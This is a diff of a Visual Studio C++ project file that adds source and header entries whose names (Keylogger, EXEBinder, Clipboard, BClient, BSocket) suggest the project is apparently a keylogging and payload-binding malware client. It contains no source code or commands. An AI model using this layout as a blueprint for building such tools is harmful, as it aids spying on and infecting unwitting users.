@@ -139,7 +139,26 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
+    <ClCompile Include="Base.cpp" />
+    <ClCompile Include="BClient.cpp" />
+    <ClCompile Include="BSocket.cpp" />
+    <ClCompile Include="Clipboard.cpp" />
+    <ClCompile Include="EXEBinder.cpp" />
+    <ClCompile Include="Keylogger.cpp" />
     <ClCompile Include="Main.cpp" />
+    <ClCompile Include="Miscellaneous.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="Base.h" />
+    <ClInclude Include="BClient.h" />
+    <ClInclude Include="BSocket.h" />
+    <ClInclude Include="Clipboard.h" />
+    <ClInclude Include="CPNL.h" />
+    <ClInclude Include="EXEBinder.h" />
+    <ClInclude Include="Keylogger.h" />
+    <ClInclude Include="Miscellaneous.h" />
+    <ClInclude Include="Reality.h" />
+    <ClInclude Include="Redefines.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
